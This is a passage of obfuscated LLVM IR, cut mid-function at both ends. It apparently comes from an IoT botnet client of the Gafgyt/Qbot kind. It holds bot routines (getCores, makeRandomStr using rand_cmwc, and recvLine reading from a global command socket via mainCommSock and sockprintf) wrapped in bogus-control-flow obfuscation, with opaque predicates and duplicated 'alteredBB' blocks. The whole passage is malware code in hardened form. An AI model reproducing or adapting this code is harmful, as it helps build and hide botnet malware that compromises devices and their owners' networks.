  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 10
  br label %77

; <label>:77:                                     ; preds = %68, %59
  %78 = phi i1 [ true, %59 ], [ %76, %68 ]
  %79 = load i32, i32* @x.33
  %80 = load i32, i32* @y.34
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %77
  %87 = load i32, i32* @x.33
  %88 = load i32, i32* @y.34
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %78, label %95, label %101

; <label>:95:                                     ; preds = %originalBBpart24
  %96 = load i8*, i8** %6, align 8
  %97 = load i8*, i8** %6, align 8
  %98 = call i64 @strlen(i8* %97) #10
  %99 = sub i64 %98, 1
  %100 = getelementptr inbounds i8, i8* %96, i64 %99
  store i8 0, i8* %100, align 1
  br label %59

; <label>:101:                                    ; preds = %originalBBpart24
  %102 = load i32, i32* @x.33
  %103 = load i32, i32* @y.34
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %101
  %110 = load i8*, i8** %6, align 8
  %111 = call i8* @strchr(i8* %110, i32 46) #10
  %112 = icmp ne i8* %111, null
  %113 = load i32, i32* @x.33
  %114 = load i32, i32* @y.34
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %112, label %121, label %140

; <label>:121:                                    ; preds = %originalBBpart28
  %122 = load i32, i32* @x.33
  %123 = load i32, i32* @y.34
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %121
  %130 = load i8*, i8** %6, align 8
  %131 = call i8* @strchr(i8* %130, i32 46) #10
  store i8 0, i8* %131, align 1
  %132 = load i32, i32* @x.33
  %133 = load i32, i32* @y.34
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %140

; <label>:140:                                    ; preds = %originalBBpart212, %originalBBpart28
  %141 = load i32, i32* @x.33
  %142 = load i32, i32* @y.34
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %140
  %149 = load i8*, i8** %3, align 8
  %150 = load i8*, i8** %6, align 8
  %151 = call i8* @strcpy(i8* %149, i8* %150) #2
  %152 = load i32, i32* %4, align 4
  %153 = call i32 @close(i32 %152)
  store i32 0, i32* %2, align 4
  %154 = load i32, i32* @x.33
  %155 = load i32, i32* @y.34
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %167

; <label>:162:                                    ; preds = %13
  %163 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %163, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:164:                                    ; preds = %8
  %165 = load i32, i32* %4, align 4
  %166 = call i32 @close(i32 %165)
  store i32 1, i32* %2, align 4
  br label %167

; <label>:167:                                    ; preds = %164, %originalBBpart216
  %168 = load i32, i32* %2, align 4
  ret i32 %168

originalBBalteredBB:                              ; preds = %originalBB, %37
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %77
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %101
  %169 = load i8*, i8** %6, align 8
  %170 = call i8* @strchr(i8* %169, i32 46) #10
  %171 = icmp ne i8* %170, null
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %121
  %172 = load i8*, i8** %6, align 8
  %173 = call i8* @strchr(i8* %172, i32 46) #10
  store i8 0, i8* %173, align 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %140
  %174 = load i8*, i8** %3, align 8
  %175 = load i8*, i8** %6, align 8
  %176 = call i8* @strcpy(i8* %174, i8* %175) #2
  %177 = load i32, i32* %4, align 4
  %178 = call i32 @close(i32 %177)
  store i32 0, i32* %2, align 4
  br label %originalBB14
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = load i32, i32* @x.35
  %2 = load i32, i32* @y.36
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [4096 x i8], align 16
  store i32 0, i32* %9, align 4
  %12 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i32 0, i32 0), i32 0)
  store i32 %12, i32* %10, align 4
  %13 = load i32, i32* @x.35
  %14 = load i32, i32* @y.36
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %21

; <label>:21:                                     ; preds = %originalBBpart24, %originalBBpart2
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  %23 = load i32, i32* %10, align 4
  %24 = call i8* @fdgets(i8* %22, i32 4096, i32 %23)
  %25 = icmp ne i8* %24, null
  br i1 %25, label %26, label %53

; <label>:26:                                     ; preds = %21
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  call void @uppercase(i8* %27)
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  %29 = call i8* @strstr(i8* %28, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0)) #10
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  %31 = icmp eq i8* %29, %30
  br i1 %31, label %32, label %35

; <label>:32:                                     ; preds = %26
  %33 = load i32, i32* %9, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %9, align 4
  br label %35

; <label>:35:                                     ; preds = %32, %26
  %36 = load i32, i32* @x.35
  %37 = load i32, i32* @y.36
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %35
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 4096, i32 16, i1 false)
  %45 = load i32, i32* @x.35
  %46 = load i32, i32* @y.36
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %21

; <label>:53:                                     ; preds = %21
  %54 = load i32, i32* %10, align 4
  %55 = call i32 @close(i32 %54)
  %56 = load i32, i32* %9, align 4
  ret i32 %56

originalBBalteredBB:                              ; preds = %originalBB, %0
  %57 = alloca i32, align 4
  %58 = alloca i32, align 4
  %59 = alloca [4096 x i8], align 16
  store i32 0, i32* %57, align 4
  %60 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i32 0, i32 0), i32 0)
  store i32 %60, i32* %58, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %35
  %61 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %61, i8 0, i64 4096, i32 16, i1 false)
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* @x.39
  %35 = load i32, i32* @y.40
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i32, i32* %5, align 4
  %43 = srem i32 %42, 64
  %44 = zext i32 %43 to i64
  %45 = shl i64 1, %44
  %46 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %47 = load i32, i32* %5, align 4
  %48 = sdiv i32 %47, 64
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [16 x i64], [16 x i64]* %46, i64 0, i64 %49
  %51 = load i64, i64* %50, align 8
  %52 = or i64 %51, %45
  store i64 %52, i64* %50, align 8
  %53 = load i32, i32* %5, align 4
  %54 = add nsw i32 %53, 1
  %55 = call i32 @select(i32 %54, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %55, i32* %12, align 4
  %56 = icmp sle i32 %55, 0
  %57 = load i32, i32* @x.39
  %58 = load i32, i32* @y.40
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %56, label %65, label %168

; <label>:65:                                     ; preds = %originalBBpart2
  br label %66

; <label>:66:                                     ; preds = %131, %65
  %67 = load i32, i32* @x.39
  %68 = load i32, i32* @y.40
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %66
  %75 = load i32, i32* %13, align 4
  %76 = icmp slt i32 %75, 10
  %77 = load i32, i32* @x.39
  %78 = load i32, i32* @y.40
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br i1 %76, label %85, label %151

; <label>:85:                                     ; preds = %originalBBpart223
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = call i32 (i32, i8*, ...) @sockprintf(i32 %86, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i32 0, i32 0))
  %88 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %88, align 8
  %89 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %89, align 8
  br label %90

; <label>:90:                                     ; preds = %85
  %91 = load i32, i32* @x.39
  %92 = load i32, i32* @y.40
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %90
  %99 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %100 = getelementptr inbounds [16 x i64], [16 x i64]* %99, i64 0, i64 0
  %101 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %100) #2, !srcloc !2
  %102 = extractvalue { i64, i64* } %101, 0
  %103 = extractvalue { i64, i64* } %101, 1
  %104 = trunc i64 %102 to i32
  store i32 %104, i32* %14, align 4
  %105 = ptrtoint i64* %103 to i64
  %106 = trunc i64 %105 to i32
  store i32 %106, i32* %15, align 4
  %107 = load i32, i32* @x.39
  %108 = load i32, i32* @y.40
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %115

; <label>:115:                                    ; preds = %originalBBpart227
  %116 = load i32, i32* %5, align 4
  %117 = srem i32 %116, 64
  %118 = zext i32 %117 to i64
  %119 = shl i64 1, %118
  %120 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %121 = load i32, i32* %5, align 4
  %122 = sdiv i32 %121, 64
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds [16 x i64], [16 x i64]* %120, i64 0, i64 %123
  %125 = load i64, i64* %124, align 8
  %126 = or i64 %125, %119
  store i64 %126, i64* %124, align 8
  %127 = load i32, i32* %5, align 4
  %128 = add nsw i32 %127, 1
  %129 = call i32 @select(i32 %128, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %129, i32* %12, align 4
  %130 = icmp sle i32 %129, 0
  br i1 %130, label %131, label %134

; <label>:131:                                    ; preds = %115
  %132 = load i32, i32* %13, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %13, align 4
  br label %66

; <label>:134:                                    ; preds = %115
  %135 = load i32, i32* @x.39
  %136 = load i32, i32* @y.40
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %134
  %143 = load i32, i32* @x.39
  %144 = load i32, i32* @y.40
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %151

; <label>:151:                                    ; preds = %originalBBpart231, %originalBBpart223
  %152 = load i32, i32* @x.39
  %153 = load i32, i32* @y.40
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %151
  %160 = load i32, i32* @x.39
  %161 = load i32, i32* @y.40
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %168

; <label>:168:                                    ; preds = %originalBBpart235, %originalBBpart2
  %169 = load i32, i32* @x.39
  %170 = load i32, i32* @y.40
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %168
  store i32 0, i32* %18, align 4
  %177 = load i8*, i8** %6, align 8
  store i8* %177, i8** %17, align 8
  %178 = load i32, i32* @x.39
  %179 = load i32, i32* @y.40
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %186

; <label>:186:                                    ; preds = %originalBBpart262, %originalBBpart239
  %187 = load i32, i32* @x.39
  %188 = load i32, i32* @y.40
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %186
  %195 = load i32, i32* %7, align 4
  %196 = add nsw i32 %195, -1
  store i32 %196, i32* %7, align 4
  %197 = icmp sgt i32 %195, 1
  %198 = load i32, i32* @x.39
  %199 = load i32, i32* @y.40
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBBpart244, label %originalBB41alteredBB

originalBBpart244:                                ; preds = %originalBB41
  br i1 %197, label %206, label %271

; <label>:206:                                    ; preds = %originalBBpart244
  %207 = load i32, i32* @mainCommSock, align 4
  %208 = call i64 @recv(i32 %207, i8* %16, i64 1, i32 0)
  %209 = icmp ne i64 %208, 1
  br i1 %209, label %210, label %228

; <label>:210:                                    ; preds = %206
  %211 = load i32, i32* @x.39
  %212 = load i32, i32* @y.40
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %210
  %219 = load i8*, i8** %17, align 8
  store i8 0, i8* %219, align 1
  store i32 -1, i32* %4, align 4
  %220 = load i32, i32* @x.39
  %221 = load i32, i32* @y.40
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %274

; <label>:228:                                    ; preds = %206
  %229 = load i32, i32* @x.39
  %230 = load i32, i32* @y.40
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %228
  %237 = load i8, i8* %16, align 1
  %238 = load i8*, i8** %17, align 8
  %239 = getelementptr inbounds i8, i8* %238, i32 1
  store i8* %239, i8** %17, align 8
  store i8 %237, i8* %238, align 1
  %240 = load i8, i8* %16, align 1
  %241 = zext i8 %240 to i32
  %242 = icmp eq i32 %241, 10
  %243 = load i32, i32* @x.39
  %244 = load i32, i32* @y.40
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %242, label %251, label %252

; <label>:251:                                    ; preds = %originalBBpart252
  br label %271

; <label>:252:                                    ; preds = %originalBBpart252
  %253 = load i32, i32* @x.39
  %254 = load i32, i32* @y.40
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %252
  %261 = load i32, i32* %18, align 4
  %262 = add nsw i32 %261, 1
  store i32 %262, i32* %18, align 4
  %263 = load i32, i32* @x.39
  %264 = load i32, i32* @y.40
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart262, label %originalBB54alteredBB

originalBBpart262:                                ; preds = %originalBB54
  br label %186

; <label>:271:                                    ; preds = %251, %originalBBpart244
  %272 = load i8*, i8** %17, align 8
  store i8 0, i8* %272, align 1
  %273 = load i32, i32* %18, align 4
  store i32 %273, i32* %4, align 4
  br label %274

; <label>:274:                                    ; preds = %271, %originalBBpart248
  %275 = load i32, i32* @x.39
  %276 = load i32, i32* @y.40
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %274
  %283 = load i32, i32* %4, align 4
  %284 = load i32, i32* @x.39
  %285 = load i32, i32* @y.40
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  ret i32 %283

originalBBalteredBB:                              ; preds = %originalBB, %33
  %292 = load i32, i32* %5, align 4
  %_ = sub i32 0, %292
  %gen = add i32 %_, 64
  %_1 = sub i32 0, %292
  %gen2 = add i32 %_1, 64
  %_3 = shl i32 %292, 64
  %_4 = sub i32 %292, 64
  %gen5 = mul i32 %_4, 64
  %_6 = sub i32 0, %292
  %gen7 = add i32 %_6, 64
  %293 = srem i32 %292, 64
  %294 = zext i32 %293 to i64
  %_8 = shl i64 1, %294
  %_9 = shl i64 1, %294
  %_10 = sub i64 0, 1
  %gen11 = add i64 %_10, %294
  %_12 = shl i64 1, %294
  %295 = shl i64 1, %294
  %296 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %297 = load i32, i32* %5, align 4
  %298 = sdiv i32 %297, 64
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds [16 x i64], [16 x i64]* %296, i64 0, i64 %299
  %301 = load i64, i64* %300, align 8
  %_13 = sub i64 %301, %295
  %gen14 = mul i64 %_13, %295
  %_15 = shl i64 %301, %295
  %_16 = sub i64 0, %301
  %gen17 = add i64 %_16, %295
  %_18 = shl i64 %301, %295
  %302 = or i64 %301, %295
  store i64 %302, i64* %300, align 8
  %303 = load i32, i32* %5, align 4
  %_19 = shl i32 %303, 1
  %_20 = shl i32 %303, 1
  %304 = add nsw i32 %303, 1
  %305 = call i32 @select(i32 %304, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %305, i32* %12, align 4
  %306 = icmp sle i32 %305, 0
  br label %originalBB

originalBB21alteredBB:                            ; preds = %originalBB21, %66
  %307 = load i32, i32* %13, align 4
  %308 = icmp slt i32 %307, 10
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %90
  %309 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %310 = getelementptr inbounds [16 x i64], [16 x i64]* %309, i64 0, i64 0
  %311 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %310) #2, !srcloc !2
  %312 = extractvalue { i64, i64* } %311, 0
  %313 = extractvalue { i64, i64* } %311, 1
  %314 = trunc i64 %312 to i32
  store i32 %314, i32* %14, align 4
  %315 = ptrtoint i64* %313 to i64
  %316 = trunc i64 %315 to i32
  store i32 %316, i32* %15, align 4
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %134
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %151
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %168
  store i32 0, i32* %18, align 4
  %317 = load i8*, i8** %6, align 8
  store i8* %317, i8** %17, align 8
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %186
  %318 = load i32, i32* %7, align 4
  %_42 = shl i32 %318, -1
  %319 = add nsw i32 %318, -1
  store i32 %319, i32* %7, align 4
  %320 = icmp sgt i32 %318, 1
  br label %originalBB41

originalBB46alteredBB:                            ; preds = %originalBB46, %210
  %321 = load i8*, i8** %17, align 8
  store i8 0, i8* %321, align 1
  store i32 -1, i32* %4, align 4
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %228
  %322 = load i8, i8* %16, align 1
  %323 = load i8*, i8** %17, align 8
